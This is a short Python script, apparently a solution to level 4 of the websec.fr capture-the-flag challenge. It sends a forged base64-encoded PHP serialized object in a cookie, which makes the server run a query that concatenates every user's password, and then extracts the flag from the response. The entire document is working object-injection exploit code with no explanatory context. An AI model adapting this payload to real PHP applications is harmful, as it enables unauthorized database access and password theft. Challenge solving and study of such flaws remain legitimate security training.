import httpx
import re

url = "https://websec.fr/level04/index.php"
cookie = { 'leet_hax0r' : 'TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NTM6IlNFTEVDVCBHUk9VUF9DT05DQVQocGFzc3dvcmQpIEFTIHVzZXJuYW1lIEZST00gdXNlcnM7IjtzOjQ6ImNvbm4iO047fQ==' }

r = httpx.get(url, cookies=cookie)
flag = re.search(r'WEBSEC\{.*\}', r.text).group(0)
print(flag)